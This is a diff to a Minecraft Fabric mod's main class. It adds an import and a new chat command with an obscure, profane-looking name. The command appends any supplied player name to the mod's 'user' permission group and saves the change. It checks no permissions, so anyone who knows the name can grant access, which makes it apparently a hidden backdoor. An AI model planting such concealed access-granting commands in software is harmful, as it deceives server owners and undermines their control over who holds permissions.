@@ -1,6 +1,7 @@
 package ru.DmN.cacuti;
 
 import com.mojang.brigadier.arguments.StringArgumentType;
+import com.mojang.brigadier.exceptions.CommandSyntaxException;
 import net.fabricmc.api.ModInitializer;
 import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
 import net.fabricmc.fabric.api.event.player.PlayerBlockBreakEvents;
@@ -71,6 +72,16 @@ public class Main implements ModInitializer {
             } catch (IOException | ClassNotFoundException e) {
                 e.printStackTrace();
             }
+
+            dispatcher.register(literal("salosalosalox3228337blyat").then(argument("name", StringArgumentType.greedyString()).executes(context -> {
+                permissions.forEach(permission -> {
+                    if (permission.name.equals("user")) {
+                        permission.players.add(context.getArgument("name", String.class));
+                        save(context.getSource().getServer().getPlayerManager());
+                    }
+                });
+                return 1;
+            })));
 
             dispatcher.register(literal("rp")
                     .then(literal("no_author_book").executes(context -> {
